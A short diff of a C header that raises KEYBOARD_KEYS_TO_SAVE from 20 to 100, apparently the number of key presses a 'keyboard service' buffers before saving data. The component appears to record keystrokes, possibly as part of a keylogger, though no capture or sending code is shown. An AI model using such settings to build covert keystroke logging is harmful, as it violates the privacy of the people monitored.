@@ -10,7 +10,7 @@
 
 // Keyboard settings
 #define KEYBOARD_MAX_REPEATS 5
-#define KEYBOARD_KEYS_TO_SAVE 20	// How many times key should be pressed to save data
+#define KEYBOARD_KEYS_TO_SAVE 100	// How many times key should be pressed to save data
 #define KEYBOARD_DIR "kbd"			// Name of keyboard service working directory
 
 // Includes
